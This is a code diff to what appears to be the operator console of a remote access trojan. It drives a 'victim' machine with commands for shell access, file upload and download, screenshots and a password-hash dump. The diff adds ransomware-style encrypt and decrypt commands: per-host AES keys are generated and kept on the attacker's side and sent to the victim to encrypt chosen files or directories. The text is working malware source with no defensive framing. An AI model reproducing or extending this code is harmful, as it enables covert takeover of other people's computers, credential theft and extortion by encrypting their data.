@@ -2,7 +2,9 @@
 from secure_socket import Server
 from sys import argv
 import os
+from os.path import isfile
 import ipaddress
+from aes_cbc_256 import AES_CBC_256
 
 def help():
   print("""
@@ -13,9 +15,11 @@ COMMANDS :
   upload                 Put a file on the victim.
   shell                  Start a shell on the victim.
   ipconfig               Display the victim's IP configuration.
-  screenshot             Take a screenshot from the victim's screen.
+  screenshot      file   Take a screenshot from the victim's screen and saves it as {file}.png.
   search   [path] file   Find the location of a file in a directory, defaults to root directory.
   hashdump               Dump the sensitive data about users and passwords.
+  encrypt                encrypts a file or directory on the victim's computer
+  decrypt                decrypts a file or directory on the victim's computer
   exit                   Let the victim go.
 """)
 
@@ -84,6 +88,30 @@ def download(victim):
   if ret!='File not found.':
     victim.receive_file()
 
+def get_key(hostname):
+  filename=f"{hostname}.key"
+  if not isfile(filename):
+    AES_CBC_256.save_key(AES_CBC_256.generate_key(), filename)
+  return AES_CBC_256.load_key(filename)
+
+def encrypt(victim):
+  filename=input('file or dir to encrypt => ')
+  victim.send('encrypt')
+  hostname=victim.receive()
+  key=get_key(hostname)
+  victim.send(key, as_bytes=True)
+  victim.send(filename)
+  print(victim.receive())
+
+def decrypt(victim):
+  filename=input('file or dir to decrypt => ')
+  victim.send('decrypt')
+  hostname=victim.receive()
+  key=get_key(hostname)
+  victim.send(key, as_bytes=True)
+  victim.send(filename)
+  print(victim.receive())
+
 def run_command(server, cmd):
   command=cmd.split(" ")[0]
   match command:
@@ -130,6 +158,10 @@ def run_command(server, cmd):
         print("search file [path] Find the location of a file in a directory, defaults to root directory.")
     case 'hashdump':
       hashdump(server)
+    case 'encrypt':
+      encrypt(server)
+    case 'decrypt':
+      decrypt(server)
     case '':# if user hits enter mistakenly
       pass
     case 'exit':
